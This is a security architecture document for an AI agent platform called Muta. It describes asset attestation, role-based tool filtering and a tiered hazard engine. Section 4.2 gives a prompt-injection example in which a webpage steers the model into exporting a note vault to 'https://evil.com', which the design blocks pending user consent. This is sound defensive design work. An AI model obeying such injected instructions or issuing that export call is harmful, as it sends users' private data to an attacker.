# Asset attestation and hazard mesh architecture

- Status: Living Blueprint
- Last Updated: 2026-10-02
- Scope: `muta-contracts`, `muta-persistence`, `muta-agent`, `muta-runtime`, `muta-mcp`, `mutx`
- Governing records: [ADR-0146](../adr/0146-tool-hazard-model-and-permission-submissions.md),
  [ADR-0147](../adr/0147-orthogonal-workspace-security-planes.md),
  [ADR-0204](../adr/0204-egress-confinement-ssrf-defense-and-http2-boundary.md),
  [ADR-0219](../adr/0219-session-scope-and-optional-workspace-binding.md),
  [ADR-0240](../adr/0240-main-agent-mcp-unification-and-lifecycle-activity-architecture.md),
  [ADR-0242](../adr/0242-orthogonal-mcp-registry-and-role-capability-subscription.md),
  [ADR-0243](../adr/0243-unified-asset-attestation-and-zero-trust-hazard-mesh.md)

---

## 1. System overview and boundaries

Modern AI agents bridge probabilistic cognitive computation with deterministic host operating system resources. Security in Muta is organized across three orthogonal, independent planes:

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. Physical Spawn Plane (Asset Attestation)                                 │
│    • Answers: "May this external OS executable or network socket launch?"   │
│    • Governed by: AssetAttestationLedger, SHA-256 fingerprint attestation   │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │ Verified Process Pool
┌──────────────────────────────────────▼──────────────────────────────────────┐
│ 2. Logical Governance Plane (Cascading Role Capability Slicing)             │
│    • Answers: "Which tools may this role see in its ReAct loop?"            │
│    • Governed by: roles.toml + Workspace .muta/config.toml overrides        │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │ Admitted Toolset
┌──────────────────────────────────────▼──────────────────────────────────────┐
│ 3. Runtime Hazard Plane (Execution & Egress Mesh)                           │
│    • Answers: "May this concrete model tool call execute right now?"        │
│    • Governed by: Four-Tier Hazard Engine, PermissionChain, Egress Guard    │
└─────────────────────────────────────────────────────────────────────────────┘
```

Conflating these planes is the root cause of security bypasses (e.g. assuming that a trusted workspace file grants permission to make external network calls, or that workspace-free sessions require no process launch security).

---

## 2. Physical spawn plane: Universal Asset Attestation

### 2.1 The Asset Specification (`AssetSpec`)
Every external tool provider, stdio process, or remote connection is modeled as an atomic specification:
- `Process { command: Vec<String>, env: BTreeMap<String, String> }`: OS child process (e.g. Stdio MCP server, git hooks).
- `RemoteEndpoint { url: String, headers: BTreeMap<String, String> }`: External HTTP/SSE service.

### 2.2 Normalized Cryptographic Fingerprint
The ledger computes an immutable SHA-256 digest over the canonical serialization of the `AssetSpec`. Any change to the binary name, command arguments, sensitive environment variables, or endpoint URL alters the digest.

### 2.3 Universal Attestation Ledger (`assets.db`)
Stored in SQLite under `$XDG_DATA_HOME/muta/assets.db`.
- **Zero Workspace Dependency**: Operates system-wide. Whether an asset is introduced via `~/.config/muta/roles.toml` (e.g. for `philosophist`) or `<workspace>/.muta/mcp.json`, it must possess an attestation entry.
- **Fail-Closed Spawn**: `McpRuntime` queries the ledger before spawning any process or connecting any remote endpoint. Unattested assets are marked `Quarantined`; physical process spawn is blocked (`[INV-TRUST-03]`).

### 2.4 Asymmetric UX: Intent Inference
- **Interactive CLI Actions (`muta mcp add`)**: When a human directly executes a CLI addition, the interactive command execution proves human intent. The CLI automatically registers the calculated digest as `Trusted`.
- **Imported / File Assets (`roles.toml`, cloned `.muta/mcp.json`)**: Detected on startup or file-change. If the digest is unknown, a non-blocking composer card prompts for single-click verification (`[A] Trust Always`, `[S] Session Only`, `[D] Deny`).

---

## 3. Logical governance plane: Cascading Role Capability Slicing

Role capability subscriptions ([ADR-0242](../adr/0242-orthogonal-mcp-registry-and-role-capability-subscription.md)) resolve through a clean cascading hierarchy:

### 3.1 Resolution Hierarchy
1. **Workspace Override**: If the session is bound to a workspace (`workspace_root.is_some()`) and `<workspace>/.muta/config.toml` contains `[roles.<name>]`, its `admit_mcp` rules take absolute precedence.
2. **Global Definition**: If no workspace override exists, the session evaluates `admit_mcp` from `~/.config/muta/roles.toml` (or compiled defaults in `MainAgentRole`).

### 3.2 In-Memory Zero-Latency Slicing
All verified MCP servers are maintained in a persistent physical connection pool by the daemon. When the agent constructs `visible_tools()` on each turn, MCP tools (`mcp__<server>__<tool>`) are filtered in memory ($O(1)$) against the active role's resolved `admit_mcp` rules.

---

## 4. Runtime hazard plane: Four-Tier Hazard Mesh & Egress Defense

Even when an MCP server is physically authorized to run, **model tool calls remain untrusted computation** due to indirect prompt injection vulnerabilities.

### 4.1 Four-Tier Hazard Taxonomy

| Tier | Category | Examples | Enforcement Policy |
| :--- | :--- | :--- | :--- |
| **Tier 0** | **Pure Query / Read-Only** | `read_text`, `search_web`, read-only MCP queries | Executed silently with audit logging. Zero user friction. |
| **Tier 1** | **Workspace Mutation** | `edit_text`, `write_file`, workspace-bound mutations | Sandboxed to workspace paths. Recorded in turn commit delta for atomic undo. |
| **Tier 2** | **Outbound Egress & Exfiltration** | External HTTP posts, MCP tools transmitting payloads | **Interactive Consent Sheet**. Harness pauses and discloses destination host, tool, and payload. |
| **Tier 3** | **Arbitrary OS Command** | `execute_command`, shell interpreters | Governed by bash security policy and explicit human approval. |

### 4.2 Defeating Confused Deputy Attacks
When an untrusted webpage instructs the model to call `mcp__obsidian__export_vault(target="https://evil.com")`:
1. The tool is classified as `Tier 2 (Outbound Egress)`.
2. The runtime hazard engine pauses execution before dispatching the RPC call.
3. The user is presented with an explicit approval prompt containing the outbound payload preview.
4. If unapproved, execution fails safely and the injection is flagged.

---

## 5. Architectural Invariants

- `[INV-TRUST-01]` No external OS child process or remote endpoint may connect without a valid attestation record in `AssetAttestationLedger`.
- `[INV-TRUST-02]` Asset attestation applies equally to workspace-free sessions and workspace-bound sessions.
- `[INV-TRUST-03]` Role capability slicing is strictly an in-memory set filter over the persistent connection pool; switching roles never restarts OS child processes.
- `[INV-TRUST-04]` Outbound network egress originating from model-directed tool calls must pass Tier 2 hazard verification.
